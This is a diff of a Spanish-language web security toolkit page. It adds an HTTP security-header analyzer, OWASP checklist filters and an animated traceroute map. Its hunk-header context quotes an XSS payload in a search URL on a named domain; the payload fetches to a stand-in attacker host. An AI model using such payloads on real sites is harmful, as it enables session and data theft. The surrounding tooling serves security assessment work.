@@ -644,6 +644,8 @@ footer{padding:40px 10%;border-top:1px solid rgba(0,255,65,.1);display:flex;just
   .hero-terminal{font-size:.68rem;padding:10px;}
   .about-grid{grid-template-columns:1fr!important;gap:20px!important;}
 }
+@keyframes hopPulse{0%{transform:scale(1.6);opacity:.4;}100%{transform:scale(1);opacity:1;}}
+@keyframes hopRing{0%{transform:scale(1);opacity:.5;}100%{transform:scale(2);opacity:0;}}
 </style>
 </head>
 <body data-v="y000-eda2c79f">
@@ -1611,18 +1613,33 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
 
 
   <div class="tk-panel" id="tk-headers2">
-    <div class="tk-desc">HTTP Header Analyzer &mdash; <span style="color:var(--g)">CSP · HSTS · cookies · clickjacking · CORS</span>
-      <span style="color:rgba(0,255,65,.3)"> // pega los headers de respuesta — análisis local</span></div>
+    <div class="tk-desc">HTTP Security Header Analyzer &mdash; <span style="color:var(--g)">HSTS · CSP · X-Frame · CORS · Fingerprint</span>
+      <span style="color:rgba(0,255,65,.3)"> // fetch en vivo via proxy o análisis manual</span></div>
+
+    <!-- LIVE FETCH MODE -->
+    <div style="margin-bottom:6px;font-size:.6rem;color:var(--amber);letter-spacing:.06em;">🌐 FETCH EN VIVO</div>
     <div class="tk-row" style="gap:8px;margin-bottom:8px;">
-      <textarea id="ha-input" class="tk-input" style="width:100%;height:100px;resize:vertical;font-size:.68rem;"
-        placeholder="Pega aquí los headers HTTP de respuesta:&#10;&#10;HTTP/1.1 200 OK&#10;Content-Type: text/html; charset=utf-8&#10;Strict-Transport-Security: max-age=31536000&#10;X-Frame-Options: DENY&#10;Content-Security-Policy: default-src 'self'&#10;Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict&#10;..."></textarea>
+      <input id="headers-url" class="tk-input" placeholder="dominio.com o https://target.com"
+        style="flex:3;font-size:.82rem;" onkeydown="if(event.key==='Enter')analyzeHeaders()"/>
+      <button class="tk-btn" onclick="analyzeHeaders()" style="min-width:120px;font-size:.78rem;">🛡 ANALIZAR</button>
+      <button class="tk-btn sec" onclick="document.getElementById('headers-out').innerHTML='';" style="font-size:.65rem;">✕</button>
     </div>
-    <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
-      <button class="tk-btn" onclick="analyzeHeaders()" style="font-size:.78rem;min-width:100px;">🛡 ANALIZAR</button>
-      <button class="tk-btn sec" onclick="haLoadSample()" style="font-size:.65rem;">Cargar ejemplo</button>
-      <button class="tk-btn sec" onclick="document.getElementById('ha-input').value='';document.getElementById('ha-out').innerHTML='';document.getElementById('ha-out').classList.remove('show');" style="font-size:.65rem;">✕ Limpiar</button>
+    <div class="tk-output" id="headers-out" style="min-height:0;margin-bottom:16px;"></div>
+
+    <!-- MANUAL PASTE MODE -->
+    <div style="border-top:1px solid rgba(0,255,65,.1);padding-top:12px;margin-top:4px;">
+      <div style="margin-bottom:6px;font-size:.6rem;color:rgba(0,255,65,.4);letter-spacing:.06em;">📋 ANÁLISIS MANUAL (pega headers)</div>
+      <div class="tk-row" style="gap:8px;margin-bottom:8px;">
+        <textarea id="ha-input" class="tk-input" style="width:100%;height:80px;resize:vertical;font-size:.68rem;"
+          placeholder="HTTP/1.1 200 OK&#10;Strict-Transport-Security: max-age=31536000&#10;X-Frame-Options: DENY&#10;Content-Security-Policy: default-src 'self'&#10;..."></textarea>
+      </div>
+      <div style="display:flex;gap:8px;flex-wrap:wrap;">
+        <button class="tk-btn" onclick="analyzeHeadersManual()" style="font-size:.72rem;">🔍 ANALIZAR MANUAL</button>
+        <button class="tk-btn sec" onclick="haLoadSample()" style="font-size:.62rem;">Ejemplo</button>
+        <button class="tk-btn sec" onclick="document.getElementById('ha-input').value='';document.getElementById('ha-out').innerHTML='';" style="font-size:.62rem;">✕</button>
+      </div>
+      <div class="tk-output" id="ha-out" style="min-height:0;margin-top:8px;"></div>
     </div>
-    <div class="tk-output" id="ha-out" style="min-height:0;"></div>
   </div>
 
   <div class="tk-panel" id="tk-cidr">
@@ -1931,7 +1948,22 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
 </div>
 
 <div id="tk-owasp" class="tk-panel">
-  <div id="owasp-progress" style="font-size:.62rem;color:rgba(0,255,65,.4);margin-bottom:12px;"></div>
+  <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px;">
+    <div id="owasp-progress" style="font-size:.62rem;color:rgba(0,255,65,.4);flex:1;min-width:120px;"></div>
+    <button class="tk-btn" onclick="owaspExportPDF()" style="font-size:.62rem;padding:4px 12px;">📄 Exportar PDF</button>
+    <button class="port-cat-btn" onclick="owaspReset()" style="font-size:.6rem;">↺ Reset</button>
+  </div>
+  <div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:10px;">
+    <button class="port-cat-btn active" onclick="owaspCatFilter(this,'all')">TODO</button>
+    <button class="port-cat-btn" onclick="owaspCatFilter(this,'INFO')">INFO</button>
+    <button class="port-cat-btn" onclick="owaspCatFilter(this,'CONFIG')">CONFIG</button>
+    <button class="port-cat-btn" onclick="owaspCatFilter(this,'AUTHN')">AUTHN</button>
+    <button class="port-cat-btn" onclick="owaspCatFilter(this,'AUTHZ')">AUTHZ</button>
+    <button class="port-cat-btn" onclick="owaspCatFilter(this,'INPVAL')">INPVAL</button>
+    <button class="port-cat-btn" onclick="owaspCatFilter(this,'SESS')">SESS</button>
+    <button class="port-cat-btn" onclick="owaspCatFilter(this,'CRYPST')">CRYPTO</button>
+    <button class="port-cat-btn" onclick="owaspCatFilter(this,'CLIENT')">CLIENT</button>
+  </div>
   <div id="owasp-list"></div>
 </div>
 
@@ -5562,6 +5594,69 @@ async function analyzeHeaders(){
   }
 }
 
+function analyzeHeadersManual(){
+  var raw=(document.getElementById('ha-input')||{value:''}).value.trim();
+  var o=document.getElementById('ha-out');
+  if(!raw){alert('Pega los headers HTTP primero');return;}
+  // Parse raw header text into key:value map
+  var h={};
+  raw.split('\n').forEach(function(line){
+    var m=line.match(/^([\w\-]+):\s*(.+)$/i);
+    if(m) h[m[1].toLowerCase()]=m[2].trim();
+  });
+  // Run the same checks as live analyzer
+  var checks=[
+    {name:'Strict-Transport-Security',key:'strict-transport-security',weight:25,
+     good:function(v){return !!(v&&v.includes('max-age=')&&parseInt((v.match(/max-age=(\d+)/)||[0,0])[1])>=15768000);},
+     tip:'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'},
+    {name:'Content-Security-Policy',key:'content-security-policy',weight:25,
+     good:function(v){return !!(v&&v.length>10);},
+     tip:"Content-Security-Policy: default-src 'self'; script-src 'self'"},
+    {name:'X-Frame-Options',key:'x-frame-options',weight:15,
+     good:function(v){return !!(v&&/deny|sameorigin/i.test(v));},
+     tip:'X-Frame-Options: SAMEORIGIN'},
+    {name:'X-Content-Type-Options',key:'x-content-type-options',weight:15,
+     good:function(v){return !!(v&&v.toLowerCase()==='nosniff');},
+     tip:'X-Content-Type-Options: nosniff'},
+    {name:'Referrer-Policy',key:'referrer-policy',weight:5,
+     good:function(v){return !!(v&&v.length>3);},
+     tip:'Referrer-Policy: strict-origin-when-cross-origin'},
+    {name:'Permissions-Policy',key:'permissions-policy',weight:5,
+     good:function(v){return !!(v&&v.length>3);},
+     tip:'Permissions-Policy: geolocation=(), microphone=(), camera=()'},
+    {name:'X-XSS-Protection',key:'x-xss-protection',weight:3,
+     good:function(v){return !!(v&&v.startsWith('1'));},
+     tip:'X-XSS-Protection: 1; mode=block'},
+    {name:'Cache-Control',key:'cache-control',weight:2,
+     good:function(v){return !!(v&&/no-store|no-cache|private/.test(v));},
+     tip:'Cache-Control: no-store (para páginas sensibles)'},
+  ];
+  var score=0,maxScore=0,html='';
+  html+='<span style="color:rgba(0,255,65,.4)">// Fingerprint headers:</span>\n';
+  ['server','x-powered-by','via','x-generator'].forEach(function(hk){
+    if(h[hk]) html+='  <span style="color:var(--amber)">'+escH(hk)+'</span>: '+escH(String(h[hk]).substring(0,100))+' <span style="color:var(--red)">[expuesto]</span>\n';
+  });
+  if(!h.server&&!h['x-powered-by']) html+='  (sin headers de fingerprint ✓)\n';
+  html+='\n<span style="color:rgba(0,255,65,.4)">// Security headers:</span>\n';
+  checks.forEach(function(ck){
+    maxScore+=ck.weight; var val=h[ck.key]||''; var ok=ck.good(val);
+    if(ok) score+=ck.weight;
+    html+=(ok?'<span style="color:var(--g)">✓</span>':'<span style="color:var(--red)">✗</span>')+
+      ' <span style="color:'+(ok?'var(--g)':'var(--red)')+'">'+ck.name+'</span>';
+    if(val) html+=' <span style="color:rgba(0,255,65,.25);font-size:.62em;">'+escH(val.substring(0,70))+'</span>';
+    html+='\n';
+    if(!ok) html+='   <span style="color:rgba(255,200,0,.55);font-size:.63em;">💡 '+escH(ck.tip)+'</span>\n';
+  });
+  var pct=Math.round(score/maxScore*100);
+  var grade=pct>=90?'A+':pct>=80?'A':pct>=70?'B':pct>=50?'C':pct>=30?'D':'F';
+  var gc=grade.startsWith('A')?'var(--g)':grade==='B'?'#ffc800':grade==='C'?'var(--amber)':'var(--red)';
+  o.innerHTML='<div style="display:flex;align-items:center;gap:16px;margin-bottom:12px;">'+
+    '<div style="font-size:3rem;font-weight:900;color:'+gc+';">'+grade+'</div>'+
+    '<div><div style="color:'+gc+';font-size:.75rem;">'+pct+'% — Security Grade</div>'+
+    '<div style="color:rgba(0,255,65,.4);font-size:.62rem;">'+score+'/'+maxScore+' pts · análisis manual</div></div></div>\n'+html;
+  o.classList.add('show');
+}
+
 function calcCIDR(){
   var raw=(document.getElementById('cidr-input')||{value:''}).value.trim();
   var resDiv=document.getElementById('cidr-result');
@@ -6578,27 +6673,106 @@ async function runTarget(){
       }
     }catch(e){}
 
-    // Security headers check (lightweight — just grade from Observatory)
+    // Security headers — full analysis via allorigins proxy + Observatory fallback
     if(!isIP){
       try{
         tgtProgress(85,'Fase 4 · Security Headers...');
-        var obsUrl='https://observatory-api.mdn.mozilla.net/api/v2/scan?host='+encodeURIComponent(domain);
-        await fetch(obsUrl,{method:'POST',signal:AbortSignal.timeout(5000)}).catch(function(){});
-        await new Promise(function(r){setTimeout(r,4000);});
-        var obsR=await fetch(obsUrl,{signal:AbortSignal.timeout(8000)});
-        if(obsR.ok){
-          var obsD=await obsR.json();
-          if(obsD.grade){
-            _targetData.hdrGrade=obsD.grade;
-            _targetData.hdrScore=obsD.score||0;
-            _targetData.hdrFailed=obsD.tests_failed||0;
-            _targetData.hdrPassed=obsD.tests_passed||0;
-            var hCol=obsD.grade.startsWith('A')?'var(--g)':obsD.grade.startsWith('B')?'var(--amber)':'var(--red)';
-            tgtRow('HTTP Headers','<span style="color:'+hCol+'">Grade '+escH(obsD.grade)+'</span>  Score: '+escH(String(obsD.score||0))+'/100  '+
-              '<span style="color:var(--g)">✓'+escH(String(obsD.tests_passed||0))+'</span> '+
-              '<span style="color:var(--red)">✗'+escH(String(obsD.tests_failed||0))+'</span>');
+        _targetData.secHeaders={};
+
+        // 1. Fetch raw headers via allorigins
+        var hProxyUrl='https://api.allorigins.win/get?url='+encodeURIComponent('https://'+domain+'/');
+        try{
+          var hR=await fetch(hProxyUrl,{signal:AbortSignal.timeout(12000)});
+          if(hR.ok){
+            var hW=await hR.json();
+            // allorigins exposes headers in status object — parse from content hints
+            // Best effort: try to parse Link/Server from content
+            // Also try hackertarget headers API
+            var htR=await fetch('https://api.hackertarget.com/httpheaders/?q=https://'+encodeURIComponent(domain),
+              {signal:AbortSignal.timeout(10000)});
+            if(htR.ok){
+              var htTxt=await htR.text();
+              if(!htTxt.startsWith('error')){
+                // Parse headers from raw text response
+                var sh=_targetData.secHeaders;
+                var lines=htTxt.split('\n');
+                lines.forEach(function(line){
+                  var m=line.match(/^([\w\-]+):\s*(.+)$/i);
+                  if(!m) return;
+                  var k=m[1].toLowerCase(), v=m[2].trim();
+                  sh[k]=v;
+                });
+                // Score security headers
+                var HDRS_REQUIRED={
+                  'strict-transport-security':{name:'HSTS',rec:'Agrega: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'},
+                  'content-security-policy':{name:'CSP',rec:'Implementa Content-Security-Policy para prevenir XSS e inyección de recursos'},
+                  'x-frame-options':{name:'X-Frame-Options',rec:'Agrega: X-Frame-Options: DENY para prevenir clickjacking'},
+                  'x-content-type-options':{name:'X-Content-Type-Options',rec:'Agrega: X-Content-Type-Options: nosniff'},
+                  'referrer-policy':{name:'Referrer-Policy',rec:'Agrega: Referrer-Policy: strict-origin-when-cross-origin'},
+                  'permissions-policy':{name:'Permissions-Policy',rec:'Limita acceso a APIs del navegador con Permissions-Policy'},
+                };
+                var HDRS_OPTIONAL={
+                  'x-xss-protection':{name:'X-XSS-Protection',note:'Deprecado en navegadores modernos — usa CSP en su lugar'},
+                  'cross-origin-opener-policy':{name:'COOP',note:'Aísla el contexto de navegación'},
+                  'cross-origin-resource-policy':{name:'CORP',note:'Controla qué orígenes pueden cargar recursos'},
+                };
+                var present=[],missing=[],warnings=[];
+                Object.keys(HDRS_REQUIRED).forEach(function(h){
+                  if(sh[h]) present.push({h:h,v:sh[h],info:HDRS_REQUIRED[h]});
+                  else missing.push({h:h,info:HDRS_REQUIRED[h]});
+                });
+                // HSTS value check
+                if(sh['strict-transport-security']){
+                  if(sh['strict-transport-security'].indexOf('max-age')===-1||
+                     parseInt((sh['strict-transport-security'].match(/max-age=(\d+)/)||[0,0])[1])<15552000){
+                    warnings.push('HSTS max-age muy bajo — recomendado mínimo 180 días (15552000)');
+                  }
+                }
+                // CSP quality check
+                if(sh['content-security-policy']){
+                  if(sh['content-security-policy'].indexOf('unsafe-inline')>=0)
+                    warnings.push("CSP contiene 'unsafe-inline' — reduce protección contra XSS");
+                  if(sh['content-security-policy'].indexOf('unsafe-eval')>=0)
+                    warnings.push("CSP contiene 'unsafe-eval' — reduce protección contra XSS");
+                }
+                _targetData.secHeaders._present=present;
+                _targetData.secHeaders._missing=missing;
+                _targetData.secHeaders._warnings=warnings;
+                _targetData.secHeaders._raw=htTxt;
+                var secScore=Math.round((present.length/Object.keys(HDRS_REQUIRED).length)*100);
+                _targetData.secHeaders._score=secScore;
+                _targetData.hdrScore=secScore;
+
+                var hColT=secScore>=80?'var(--g)':secScore>=50?'var(--amber)':'var(--red)';
+                tgtRow('Security Headers',
+                  '<span style="color:'+hColT+'">'+secScore+'% ('+present.length+'/'+Object.keys(HDRS_REQUIRED).length+')</span>  '+
+                  '<span style="color:var(--g)">✓ '+present.length+' OK</span>  '+
+                  '<span style="color:var(--red)">✗ '+missing.length+' faltantes</span>'+
+                  (warnings.length?' <span style="color:var(--amber)">⚠'+warnings.length+' avisos</span>':''));
+
+                if(secScore<50) tgtCrit('Security Headers débiles: solo '+present.length+' de '+Object.keys(HDRS_REQUIRED).length+' cabeceras de seguridad implementadas');
+                else if(secScore<80) tgtWarn('Security Headers parciales: '+missing.length+' cabeceras faltantes');
+              }
+            }
           }
-        }
+        }catch(e2){}
+
+        // 2. Observatory fallback for grade
+        try{
+          var obsUrl='https://observatory-api.mdn.mozilla.net/api/v2/scan?host='+encodeURIComponent(domain);
+          await fetch(obsUrl,{method:'POST',signal:AbortSignal.timeout(4000)}).catch(function(){});
+          await new Promise(function(r){setTimeout(r,3500);});
+          var obsR=await fetch(obsUrl,{signal:AbortSignal.timeout(7000)});
+          if(obsR.ok){
+            var obsD=await obsR.json();
+            if(obsD.grade){
+              _targetData.hdrGrade=obsD.grade;
+              _targetData.hdrFailed=obsD.tests_failed||0;
+              _targetData.hdrPassed=obsD.tests_passed||0;
+            }
+          }
+        }catch(e3){}
+
       }catch(e){}
     }
 
@@ -7549,15 +7723,23 @@ function owaspRender(filterCat){
 
 function owaspSet(id,state){
   _owaspState[id]=state;
-  var filterBtn=document.querySelector('.tk-tab.active');
-  var cat=filterBtn?filterBtn.textContent.trim():'all';
-  owaspRender(cat==='🔐 OWASP'?'all':cat);
-  // Re-render to update button colors
-  var checks=OWASP_CHECKS.filter(function(c){return c.id===id;});
+  // Update only the 3 buttons for this item — NO full re-render (avoids scroll reset)
+  var btns=document.querySelectorAll('.otg-btn[data-otg="'+id+'"]');
+  btns.forEach(function(btn){
+    var st=btn.getAttribute('data-st');
+    if(st==='pass') btn.style.background=state==='pass'?'rgba(0,255,65,.3)':'transparent';
+    if(st==='fail') btn.style.background=state==='fail'?'rgba(255,50,50,.3)':'transparent';
+    if(st==='na')   btn.style.background=state==='na'  ?'rgba(0,255,65,.1)':'transparent';
+  });
   owaspProgress();
 }
 
 function owaspFilter(cat){
+  owaspRender(cat);
+}
+function owaspCatFilter(btn,cat){
+  btn.closest('div').querySelectorAll('.port-cat-btn').forEach(function(b){b.classList.remove('active');});
+  btn.classList.add('active');
   owaspRender(cat);
 }
 
@@ -7758,98 +7940,181 @@ async function runTraceroute(){
   geomapClear();
   var map=geomapInit();
   var leg=document.getElementById('geomap-legend');
-  geomapStatus('<span style="color:rgba(0,255,65,.4)">// Ejecutando traceroute a: '+escH(domain)+'... (15-30s)</span>');
+  geomapStatus('<span style="color:rgba(0,255,65,.4)">// Ejecutando traceroute a: '+escH(domain)+'... (puede tardar ~20s)</span>');
 
+  var txt=null;
+
+  // ── SOURCE 1: dnschecker.org (POST via allorigins) ────────────
   try{
-    // Fetch traceroute from hackertarget
-    var r=await fetch('https://api.hackertarget.com/traceroute/?q='+encodeURIComponent(domain),
-      {signal:AbortSignal.timeout(30000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var txt=await r.text();
-    if(txt.startsWith('error')||txt.includes('API count')) throw new Error(txt.substring(0,80));
-
-    // Parse hops: lines like "  1  1.2.3.4  2.345 ms  2.345 ms  2.345 ms"
-    var hops=[];
-    txt.split('\n').forEach(function(line){
-      var m=line.match(/^\s*(\d+)\s+([\d.]+)\s+([\d.]+\s*ms)/);
-      if(m) hops.push({hop:parseInt(m[1]),ip:m[2],time:m[3].trim()});
-      // Also catch * lines
-      var m2=line.match(/^\s*(\d+)\s+\*/);
-      if(m2&&!m) hops.push({hop:parseInt(m2[1]),ip:null,time:'* * *'});
-    });
-
-    geomapStatus('<span style="color:rgba(0,255,65,.4)">// '+hops.length+' hops — geolocalizando...</span>');
-
-    // Geolocate each hop IP
-    var geoHops=[];
-    for(var i=0;i<hops.length;i++){
-      var hop=hops[i];
-      if(!hop.ip){geoHops.push({hop:hop.hop,ip:'*',time:hop.time,lat:null,lng:null});continue;}
-      try{
-        var _gu='https://ipinfo.io/'+encodeURIComponent(hop.ip)+'/json';
-        var gr=await fetch('https://api.allorigins.win/get?url='+encodeURIComponent(_gu),{signal:AbortSignal.timeout(7000)});
-        if(gr.ok){
-          var _gw=await gr.json(); var gd=_gw.contents?JSON.parse(_gw.contents):null; if(!gd) throw new Error('empty');
-          if(gd.loc){
-            var pts=gd.loc.split(',');
-            geoHops.push({hop:hop.hop,ip:hop.ip,time:hop.time,
-              lat:parseFloat(pts[0]),lng:parseFloat(pts[1]),
-              city:gd.city||'',country:gd.country||'',org:gd.org||''});
-          } else {
-            geoHops.push({hop:hop.hop,ip:hop.ip,time:hop.time,lat:null,lng:null,org:gd.org||''});
-          }
-        }
-        await new Promise(function(rv){setTimeout(rv,150);});
-      }catch(e){geoHops.push({hop:hop.hop,ip:hop.ip,time:hop.time,lat:null,lng:null});}
+    geomapStatus('<span style="color:rgba(0,255,65,.4)">// [1/2] Intentando dnschecker.org...</span>');
+    var dcBody='host='+encodeURIComponent(domain);
+    var dcUrl='https://dnschecker.org/ajax_files/online_traceroute.php';
+    // POST via allorigins
+    var dcProxy='https://api.allorigins.win/get?url='+encodeURIComponent(dcUrl)+'&method=POST&body='+encodeURIComponent(dcBody);
+    var r1=await fetch(dcProxy,{signal:AbortSignal.timeout(25000)});
+    if(r1.ok){
+      var w1=await r1.json();
+      var raw1=w1.contents||'';
+      // dnschecker returns HTML or plain text with hop lines
+      // Strip HTML tags if present
+      raw1=raw1.replace(/<[^>]+>/g,' ').replace(/&nbsp;/g,' ').replace(/\s+/g,' ');
+      if(raw1.length>50&&!raw1.toLowerCase().includes('error')&&
+         (raw1.match(/\d+\.\d+\.\d+\.\d+/)||raw1.match(/\d+\s+ms/))){
+        txt=raw1;
+      }
     }
+  }catch(e1){txt=null;}
 
-    // Draw on map
-    var validHops=geoHops.filter(function(h){return h.lat!==null;});
-    var points=validHops.map(function(h){return [h.lat,h.lng];});
-
-    // Draw polyline connecting hops
-    if(points.length>1){
-      L.polyline(points,{color:'#00ff41',weight:2,opacity:0.7,
-        dashArray:'6,4'}).addTo(_geoMapInstance);
-    }
-
-    // Draw markers for each hop
-    validHops.forEach(function(h,idx){
-      var isLast=idx===validHops.length-1;
-      var color=isLast?'#ff2020':idx===0?'#ffc800':'#00ff41';
-      var icon=L.divIcon({
-        html:'<div style="background:'+color+';color:#000;border-radius:50%;width:24px;height:24px;'+
-          'display:flex;align-items:center;justify-content:center;font-weight:900;font-size:11px;'+
-          'border:2px solid rgba(0,0,0,.5);box-shadow:0 0 8px '+color+';">'+h.hop+'</div>',
-        iconSize:[24,24],iconAnchor:[12,12],className:''
-      });
-      var popup='<div style="font-size:11px;line-height:1.6;">'+
-        '<b>Hop '+h.hop+'</b> · '+escH(h.ip)+'<br>'+
-        escH(h.time)+'<br>'+
-        (h.city?escH(h.city)+', ':'')+escH(h.country)+'<br>'+
-        '<span style="color:#666;font-size:10px;">'+escH(h.org)+'</span></div>';
-      L.marker([h.lat,h.lng],{icon:icon}).addTo(_geoMapInstance).bindPopup(popup);
-    });
-
-    if(validHops.length>0){
-      try{_geoMapInstance.fitBounds(L.latLngBounds(points).pad(0.3));}catch(e){}
-    }
-
-    // Legend
-    var legHtml='<span style="color:var(--g)">Traceroute: '+hops.length+' hops</span>  ';
-    geoHops.forEach(function(h){
-      var col=h.ip==='*'?'rgba(0,255,65,.2)':h.lat?'var(--g)':'rgba(0,255,65,.35)';
-      legHtml+='<span style="color:'+col+'">'+h.hop+(h.ip&&h.ip!=='*'?' '+escH(h.ip):' *')+'</span>';
-      if(h.time&&h.time!=='* * *') legHtml+='<span style="color:rgba(0,255,65,.3);font-size:.55em;"> '+escH(h.time)+'</span>';
-      legHtml+='  ';
-    });
-    leg.innerHTML=legHtml;
-    geomapStatus('<span style="color:var(--g)">✓ Traceroute completo — '+validHops.length+'/'+hops.length+' hops geolocalizados</span>');
-
-  }catch(e){
-    geomapStatus('<span style="color:var(--red)">// Error: '+escH(e.message)+'</span>');
-    leg.innerHTML='<a href="https://api.hackertarget.com/traceroute/?q='+encodeURIComponent(domain)+'" target="_blank" style="color:rgba(0,255,65,.5)">↗ Ver raw traceroute</a>';
+  // ── SOURCE 2: hackertarget (GET, plain text) ─────────────────
+  if(!txt){
+    try{
+      geomapStatus('<span style="color:rgba(0,255,65,.4)">// [2/2] Intentando hackertarget.com...</span>');
+      var r2=await fetch('https://api.hackertarget.com/traceroute/?q='+encodeURIComponent(domain),
+        {signal:AbortSignal.timeout(30000)});
+      if(r2.ok){
+        var t2=await r2.text();
+        if(!t2.startsWith('error')&&!t2.includes('API count')&&t2.length>30) txt=t2;
+        else throw new Error(t2.substring(0,80));
+      }
+    }catch(e2){txt=null;}
   }
+
+  if(!txt){
+    geomapStatus('<span style="color:var(--red)">// Traceroute no disponible ahora — intenta de nuevo en unos minutos</span>');
+    leg.innerHTML=
+      '<a href="https://dnschecker.org/traceroute.php?query='+encodeURIComponent(domain)+'" target="_blank" style="color:rgba(0,255,65,.5)">↗ dnschecker.org</a>  '+
+      '<a href="https://tools.keycdn.com/traceroute?host='+encodeURIComponent(domain)+'" target="_blank" style="color:rgba(0,255,65,.5)">↗ KeyCDN</a>  '+
+      '<a href="https://mxtoolbox.com/SuperTool.aspx?action=tracert%3a'+encodeURIComponent(domain)+'" target="_blank" style="color:rgba(0,255,65,.5)">↗ MXToolbox</a>';
+    return;
+  }
+
+  // ── PARSE HOPS ───────────────────────────────────────────────
+  var hops=[];
+  txt.split('\n').forEach(function(line){
+    // Format: "  1  1.2.3.4  2.345 ms" or "1  hostname (1.2.3.4)  2ms"
+    var m=line.match(/^\s*(\d+)\s+[\w.\-]+\s+\(([\d.]+)\)\s+([\d.]+\s*ms)/);
+    if(!m) m=line.match(/^\s*(\d+)\s+([\d.]+)\s+([\d.]+\s*ms)/);
+    if(!m) m=line.match(/(\d+)\s+([\d.]+\.\d+\.\d+\.\d+)[^\d]([\d.]+\s*ms)/);
+    if(m) hops.push({hop:parseInt(m[1]),ip:m[2],time:m[3].trim()});
+    else{
+      var m2=line.match(/^\s*(\d+)\s+\*/);
+      if(m2) hops.push({hop:parseInt(m2[1]),ip:null,time:'* * *'});
+    }
+  });
+
+  if(!hops.length){
+    geomapStatus('<span style="color:var(--amber)">// Respuesta recibida pero sin hops parseables — formato inesperado</span>');
+    leg.innerHTML='<pre style="font-size:.6rem;color:rgba(0,255,65,.4);white-space:pre-wrap;max-height:120px;overflow:auto;">'+escH(txt.substring(0,400))+'</pre>';
+    return;
+  }
+
+  geomapStatus('<span style="color:rgba(0,255,65,.4)">// '+hops.length+' hops detectados — geolocalizando con animación...</span>');
+
+  // ── GEOLOCATE HOPS ───────────────────────────────────────────
+  var geoHops=[];
+  for(var i=0;i<hops.length;i++){
+    var hop=hops[i];
+    if(!hop.ip){geoHops.push({hop:hop.hop,ip:'*',time:hop.time,lat:null,lng:null});continue;}
+    // Skip private IPs
+    if(/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.)/.test(hop.ip)){
+      geoHops.push({hop:hop.hop,ip:hop.ip,time:hop.time,lat:null,lng:null,private:true});
+      continue;
+    }
+    try{
+      var _gu='https://ipinfo.io/'+encodeURIComponent(hop.ip)+'/json';
+      var gr=await fetch('https://api.allorigins.win/get?url='+encodeURIComponent(_gu),{signal:AbortSignal.timeout(7000)});
+      if(gr.ok){
+        var _gw=await gr.json();
+        var gd=_gw.contents?JSON.parse(_gw.contents):null;
+        if(gd&&gd.loc){
+          var pts=gd.loc.split(',');
+          geoHops.push({hop:hop.hop,ip:hop.ip,time:hop.time,
+            lat:parseFloat(pts[0]),lng:parseFloat(pts[1]),
+            city:gd.city||'',country:gd.country||'',org:gd.org||''});
+        } else {
+          geoHops.push({hop:hop.hop,ip:hop.ip,time:hop.time,lat:null,lng:null,org:(gd&&gd.org)||''});
+        }
+      }
+      await new Promise(function(r){setTimeout(r,120);});
+    }catch(e){geoHops.push({hop:hop.hop,ip:hop.ip,time:hop.time,lat:null,lng:null});}
+  }
+
+  // ── ANIMATED DRAW ────────────────────────────────────────────
+  var validHops=geoHops.filter(function(h){return h.lat!==null;});
+  var points=validHops.map(function(h){return [h.lat,h.lng];});
+
+  geomapStatus('<span style="color:var(--g)">// Dibujando ruta — '+validHops.length+'/'+hops.length+' hops geolocalizados</span>');
+
+  // Animate each hop with delay
+  var drawnPoints=[];
+  var polyline=null;
+
+  for(var j=0;j<validHops.length;j++){
+    var h=validHops[j];
+    var isFirst=j===0, isLast=j===validHops.length-1;
+    var progress=j/(validHops.length-1||1);
+
+    // Color gradient: cyan → green → amber → red (destination)
+    var color=isLast?'#ff4444':isFirst?'#00e5ff':
+      (progress<0.5?'#00ff41':'#ffaa00');
+
+    // Pulsing marker for current hop being drawn
+    var pulseSize=isLast?32:isFirst?28:22;
+    var icon=L.divIcon({
+      html:'<div style="position:relative;">'+
+        '<div style="width:'+pulseSize+'px;height:'+pulseSize+'px;background:'+color+';'+
+          'border-radius:50%;display:flex;align-items:center;justify-content:center;'+
+          'font-weight:900;font-size:'+(isLast?13:10)+'px;color:#000;'+
+          'border:2px solid rgba(0,0,0,.4);'+
+          'box-shadow:0 0 '+(isLast?16:8)+'px '+color+';'+
+          'animation:hopPulse .6s ease-out;">'+h.hop+'</div>'+
+        (isLast?'<div style="position:absolute;top:-4px;left:-4px;width:'+(pulseSize+8)+'px;height:'+(pulseSize+8)+'px;'+
+          'border-radius:50%;border:2px solid '+color+';opacity:.4;animation:hopRing 1s ease-out infinite;"></div>':'')
+        +'</div>',
+      iconSize:[pulseSize,pulseSize],iconAnchor:[pulseSize/2,pulseSize/2],className:''
+    });
+
+    var popup='<div style="font-size:11px;line-height:1.7;min-width:160px;">'+
+      '<b style="color:'+color+'">Hop '+h.hop+'</b>'+
+      (isLast?' 🎯 <b>DESTINO</b>':isFirst?' 🚀 <b>ORIGEN</b>':'')+
+      '<br><span style="color:#888;">'+escH(h.ip)+'</span>'+
+      '<br>⏱ '+escH(h.time)+
+      (h.city?'<br>📍 '+escH(h.city)+(h.country?', '+escH(h.country):''):'')+'<br>'+
+      '<span style="color:#999;font-size:10px;">'+escH(h.org||'')+'</span></div>';
+
+    L.marker([h.lat,h.lng],{icon:icon}).addTo(_geoMapInstance).bindPopup(popup);
+
+    // Draw line segment from previous point
+    drawnPoints.push([h.lat,h.lng]);
+    if(drawnPoints.length>1){
+      var seg=drawnPoints.slice(-2);
+      L.polyline(seg,{
+        color:color,weight:2,opacity:.7,
+        dashArray:'6,4'
+      }).addTo(_geoMapInstance);
+    }
+
+    // Fit map to current bounds
+    if(drawnPoints.length>=2){
+      try{_geoMapInstance.fitBounds(L.latLngBounds(drawnPoints).pad(0.3));}catch(e){}
+    }
+
+    // Animated delay between hops
+    await new Promise(function(r){setTimeout(r,350);});
+  }
+
+  // ── LEGEND ───────────────────────────────────────────────────
+  var legHtml='<span style="color:var(--g)">'+hops.length+' hops</span>  ';
+  geoHops.forEach(function(h){
+    var col=h.ip==='*'?'rgba(0,255,65,.2)':h.private?'rgba(0,255,65,.25)':h.lat?'var(--g)':'rgba(0,255,65,.35)';
